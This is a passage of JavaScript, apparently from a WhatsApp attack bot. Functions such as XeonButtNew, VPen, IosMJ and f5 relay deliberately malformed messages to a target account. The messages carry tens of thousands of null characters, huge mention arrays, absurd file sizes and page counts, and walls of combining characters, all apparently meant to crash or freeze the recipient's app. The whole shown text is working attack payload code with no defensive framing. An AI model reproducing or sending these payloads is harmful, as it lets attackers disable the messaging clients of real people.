                  jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgAPwMBIgACEQEDEQH/xAAwAAACAwEBAAAAAAAAAAAAAAADBAACBQEGAQADAQEAAAAAAAAAAAAAAAABAgMABP/aAAwDAQACEAMQAAAAz2QAZ/Q57OSj+gLlnhnQdIBnhbzugXQZXcL6CF2XcIhqctQY3oMPokgQo6ArA2ZsVnlYUvnMq3lF7UfDKToz7SneaszZLzraR84aSDD7Jn//xAAhEAACAgIDAAMBAQAAAAAAAAABAgADBBESITETIkFRgf/aAAgBAQABPwAX2A2Op9MOSj1cbE7mEgqxy8NhsvDH+9RF12YGnFTLamPg3MnFONYFDbE+1liLx9MzXNVVdan8gdgVI/DEzlYaY9xbQRuJZyE5zKT5Mhj+ATGrUXDZ6EznJs3+RuvDOz3MXJRfo8+Sv1HE+xjsP2WMEfce5XUrv2MnoI6EJB8laAnuVUdgxelj1lpkE89Q7iO0ABGx/olNROyRE2hituW9IZah2TOBI7E48PYnEJsSm3YG4AGE4lfJk2a0sZuTdxiCpIjAOkLlQBqUOS2ojagOxMonmDOXsJHHqIdtLqSdESisq2yI2otnGZP2oVoDPNiBSBvUqO9SwdQGan//xAAdEQADAQADAAMAAAAAAAAAAAAAAQIRECExMkGB/9oACAECAQE/AMlpMXejivs2kydawnr0pKkWkvHpDOitzoeMldIw1OWNaR5+8P5cf//EAB0RAAIDAAIDAAAAAAAAAAAAAAERAAIQAxIgMVH/2gAIAQMBAT8Acpx2tXsIdZHowNwaPBF4M+Z//9k="
                }
              }
            }
          }, {
            participant: {
              jid: zLoc
            }
          });
          await Dare.relayMessage(zLoc, {
            botInvokeMessage: {
              message: {
                messageContextInfo: {
                  deviceListMetadataVersion: 2,
                  deviceListMetadata: {}
                },
                interactiveMessage: {
                  nativeFlowMessage: {
                    buttons: [{
                      name: "payment_info",
                      buttonParamsJson: "{\"currency\":\"INR\",\"total_amount\":{\"value\":0,\"offset\":100},\"reference_id\":\"4PVSNK5RNNJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"pending\",\"subtotal\":{\"value\":0,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"name\":\"\",\"amount\":{\"value\":0,\"offset\":100},\"quantity\":0,\"sale_amount\":{\"value\":0,\"offset\":100}}]},\"payment_settings\":[{\"type\":\"pix_static_code\",\"pix_static_code\":{\"merchant_name\":\"🦄드림 가이 Cela;\",\"key\":\"🦄드림 가이 Cela\",\"key_type\":\"RANDOM\"}}]}"
                    }]
                  }
                }
              }
            }
          }, {
            participant: {
              jid: zLoc
            }
          });
          await Dare.relayMessage(zLoc, {
            viewOnceMessage: {
              message: {
                liveLocationMessage: {
                  degreesLatitude: 11111111,
                  degreesLongitude: -111111,
                  caption: "xeontex",
                  url: "https://" + ggg + ".com",
                  sequenceNumber: "1678556734042001",
                  jpegThumbnail: null,
                  expiration: 7776000,
                  ephemeralSettingTimestamp: "1677306667",
                  disappearingMode: {
                    initiator: "INITIATED_BY_ME",
                    inviteLinkGroupTypeV2: "DEFAULT",
                    messageContextInfo: {
                      deviceListMetadata: {
                        senderTimestamp: "1678285396",
                        recipientKeyHash: "SV5H7wGIOXqPtg==",
                        recipientTimestamp: "1678496731",
                        deviceListMetadataVersion: 2
                      }
                    }
                  },
                  contextInfo: {
                    mentionedJid: zLoc,
                    mentions: zLoc,
                    isForwarded: true,
                    fromMe: false,
                    participant: "0@s.whatsapp.net",
                    remoteJid: "0@s.whatsapp.net"
                  }
                }
              }
            }
          }, {
            participant: {
              jid: zLoc
            }
          });
        }
        
        async function XeonButtNew(zLoc, ptcp = false) {
   await Dare.relayMessage(zLoc, {
     ephemeralMessage: {
      message: {
       interactiveMessage: {
        header: {
         documentMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
          mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
          fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
          fileLength: "9999999999999",
          pageCount: 1316134911,
          mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
          fileName: "𝐃𝐀𝐑𝐄-𝐕𝟑⃟⃟⃟😈",
          fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
          directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
          mediaKeyTimestamp: "1726867151",
          contactVcard: true,
          jpegThumbnail: "",
         },
         hasMediaAttachment: true,
        },
        body: {
         text: "𝐃𝐀𝐑𝐄-𝐕𝟑⃟⃟⃟😈\n" + "@916909137213".repeat(17000),
        },
        nativeFlowMessage: {
         buttons: [{
           name: "cta_url",
           buttonParamsJson: "{ display_text: '𝐃𝐀𝐑𝐄-𝐕𝟑⃟⃟⃟😈', url: \"https://youtube.com/dgxeon\", merchant_url: \"https://youtube.com/dgxeon\" }",
          },
          {
           name: "call_permission_request",
           buttonParamsJson: "{}",
          },
         ],
         messageParamsJson: "{}",
        },
        contextInfo: {
         mentionedJid: ["916909137213@s.whatsapp.net", ...Array.from({
          length: 30000
         }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net")],
         forwardingScore: 1,
         isForwarded: true,
         fromMe: false,
         participant: "0@s.whatsapp.net",
         remoteJid: "status@broadcast",
         quotedMessage: {
          documentMessage: {
           url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
           mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
           fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
           fileLength: "9999999999999",
           pageCount: 1316134911,
           mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
           fileName: "𝐃𝐀𝐑𝐄-𝐕𝟑⃟⃟⃟😈",
           fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
           directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
           mediaKeyTimestamp: "1724474503",
           contactVcard: true,
           thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
           thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
           thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
           jpegThumbnail: "",
          },
         },
        },
       },
      },
     },
    },
    ptcp ? {
     participant: {
      jid: zLoc
     }
    } : {}
   );
  };
 async function VPen(zLoc, ptcp = false) {
    let valhalla = "Hola" + "𑲭𑲭".repeat(50000);

    let mentionedJidArray = Array.from({ length: 35000 }, () => 
        "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
    );

    let battanz = {
        groupMentionedMessage: {
            message: {
                listResponseMessage: {
                    title: " @120363326274964194@g.us",
                    listType: "SINGLE_SELECT",
                    singleSelectReply: {
                        selectedRowId: "Gateway To Hell"
                    },
                    description: " @120363326274964194@g.us",
                    contextInfo: {
                        mentionedJid: mentionedJidArray,
                        groupMentions: [{ 
                            groupJid: "120363326274964194@g.us", 
                            groupSubject: valhalla 
                        }]
                    }
                }
            }
        }
    };

    await Dare.relayMessage(zLoc, battanz, { participant: { jid: zLoc } }, { messageId: null });
}
    async function SendPairing(zLoc, Ptcp = false) {
			await Dare.relayMessage(zLoc, {
					viewOnceMessage: {
						message: {
								nativeFlowResponseMessage: {
									"status":true,
                           "criador":"VenomMods","resultado":"\n{\n\"type\":\"md\",\n\"ws\":{\n\"_events\":{\"CB:ib,,dirty\":[\"Array\"]},\n\"_eventsCount\":20,\n\"_maxListeners\":0,\n\"url\":\"wss://web.whatsapp.com/ws/chat\",\n\"config\":{\n\"version\":[\"Array\"],\n\"browser\":[\"Array\"],\n\"waWebSocketUrl\":\"wss://web.whatsapp.com/ws/chat\",\n\"connectTimeoutMs\":20000,\n\"keepAliveIntervalMs\":30000,\n\"logger\":{},\n\"printQRInTerminal\":false,\n\"emitOwnEvents\":true,\n\"defaultQueryTimeoutMs\":60000,\n\"customUploadHosts\":[],\n\"retryRequestDelayMs\":250,\n\"maxMsgRetryCount\":5,\n\"fireInitQueries\":true,\n\"auth\":{\"Object\":\"authData\"},\n\"markOnlineOnConnect\":true,\n\"syncFullHistory\":false,\n\"linkPreviewImageThumbnailWidth\":192,\n\"transactionOpts\":{\"Object\":\"transactionOptsData\"},\n\"generateHighQualityLinkPreview\":false,\n\"options\":{},\n\"appStateMacVerification\":{\"Object\":\"appStateMacData\"},\n\"mobile\":false\n}\n}\n}"
							}
						}
					}
				},
				ptcp ? {
					participant: {
						jid: zLoc
					}
				} : {}
			);
};

   async function IosMJ(zLoc, ptcp = false) {
      await Dare.relayMessage(
        zLoc,
        {
          extendedTextMessage: {
            text: "CALL" + "\u0000".repeat(90000),
            contextInfo: {
              stanzaId: "1234567890ABCDEF",
              participant: "0@s.whatsapp.net",
              quotedMessage: {
                callLogMesssage: {
                  isVideo: true,
                  callOutcome: "1",
                  durationSecs: "0",
                  callType: "REGULAR",
                  participants: [
                    {
                      jid: "0@s.whatsapp.net",
                      callOutcome: "1",
                    },
                  ],
                },
              },
              remoteJid: target,
              conversionSource: "source_example",
              conversionData: "Y29udmVyc2lvbl9kYXRhX2V4YW1wbGU=",
              conversionDelaySeconds: 10,
              forwardingScore: 99999999,
              isForwarded: true,
              quotedAd: {
                advertiserName: "Example Advertiser",
                mediaType: "IMAGE",
                jpegThumbnail:
                  "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7pK5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
                caption: "This is an ad caption",
              },
              placeholderKey: {
                remoteJid: "0@s.whatsapp.net",
                fromMe: false,
                id: "ABCDEF1234567890",
              },
              expiration: 86400,
              ephemeralSettingTimestamp: "1728090592378",
              ephemeralSharedSecret:
                "ZXBoZW1lcmFsX3NoYXJlZF9zZWNyZXRfZXhhbXBsZQ==",
              externalAdReply: {
                title: "virailix - CALL" + "\u0000".repeat(50000),
                body: "͞.⃟  𝐃𝐀𝐑𝐄-𝐕𝟑⃟⃟⃟😈⃤" + "𑜦࣯".repeat(200),
                mediaType: "VIDEO",
                renderLargerThumbnail: true,
                previewTtpe: "VIDEO",
                thumbnail:
                  "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7p5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
                sourceType: " x ",
                sourceId: " x ",
                sourceUrl: "https://t.me/Scarletsukanenen",
                mediaUrl: "https://t.me/Scarletsukanenen",
                containsAutoReply: true,
                renderLargerThumbnail: true,
                showAdAttribution: true,
                ctwaClid: "ctwa_clid_example",
                ref: "ref_example",
              },
              entryPointConversionSource: "entry_point_source_example",
              entryPointConversionApp: "entry_point_app_example",
              entryPointConversionDelaySeconds: 5,
              disappearingMode: {},
              actionLink: {
                url: "https://t.me/Scarletsukanenen",
              },
              groupSubject: "Example Group Subject",
              parentGroupJid: "6287888888888-1234567890@g.us",
              trustBannerType: "trust_banner_example",
              trustBannerAction: 1,
              isSampled: false,
              utm: {
                utmSource: "utm_source_example",
                utmCampaign: "utm_campaign_example",
              },
              forwardedNewsletterMessageInfo: {
                newsletterJid: "6287888888888-1234567890@g.us",
                serverMessageId: 1,
                newsletterName: " target ",
                contentType: "UPDATE",
                accessibilityText: " target ",
              },
              businessMessageForwardInfo: {
                businessOwnerJid: "0@s.whatsapp.net",
              },
              smbClientCampaignId: "smb_client_campaign_id_example",
              smbServerCampaignId: "smb_server_campaign_id_example",
              dataSharingContext: {
                showMmDisclosure: true,
              },
            },
          },
        },
        ptcp
          ? {
              participant: {
                jid: zLoc,
              },
            }
          : {}
      );
    }

   async function f5(zLoc, ptcp = true) {
    await Dare.relayMessage(zLoc, {
      ephemeralMessage: {
        message: {
          interactiveMessage: {
            header: {
              documentMessage: {
                url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
                mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                fileLength: "9999999999999",
                pageCount: 1316134911,
                mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
                fileName: "⭑̤▾ g͆Senkug̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆g̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆g̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆g̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆g̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆g҉ ͆҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ Crag̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺  ▾⭑̤",
                fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
                directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
                mediaKeyTimestamp: "1726867151",
                contactVcard: true
              },
              hasMediaAttachment: true
            },
            body: {
              text: "ㅤ ㅤ ㅤ ㅤ ㅤ ㅤ ㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ𓍯̤𖣂  Scarlet - U I\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A g̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆g̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆g̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆g̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆g̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆g҉ ͆҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ 